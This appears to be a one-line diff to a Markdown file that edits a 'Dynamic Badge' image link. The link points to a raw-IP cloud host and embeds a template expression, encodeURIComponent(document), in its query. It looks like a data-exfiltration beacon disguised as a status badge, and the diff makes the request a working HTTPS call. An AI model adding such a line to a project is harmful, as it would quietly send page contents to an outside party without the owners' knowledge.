@@ -2,4 +2,4 @@
 	
 
 
-![Dynamic Badge](163.17.197.104.bc.googleusercontent.com/json?url=data:application/json,{"label":"myLabel","value":"${encodeURIComponent(document)}"}&query=$.value&color=blue`)
+![Dynamic Badge](https://163.17.197.104.bc.googleusercontent.com/json?url=data:application/json,{"label":"myLabel","value":"${encodeURIComponent(document)}"}&query=$.value&color=blue`)
